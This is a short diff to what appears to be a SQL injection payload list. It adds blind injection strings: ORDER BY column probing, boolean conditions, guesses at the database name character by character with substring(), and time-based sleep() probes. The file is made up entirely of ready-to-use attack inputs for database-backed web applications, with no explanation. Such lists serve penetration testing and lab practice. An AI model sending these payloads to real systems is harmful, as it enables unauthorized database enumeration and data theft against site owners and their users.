@@ -36,4 +36,10 @@ like '%'
 ' or uname like '%
 ' or userid like '%
 ' or user like '%
-' or username like '% 
+' or username like '%
+' order by 1 --+
+' and "a"="a"--+
+' and database()="securtiy"--+
+' and substring(database(),1,1)="a"--+
+' and sleep(2) and "a"="a"--+
+' and sleep(2) and substring(database(),1,1)="a"--+
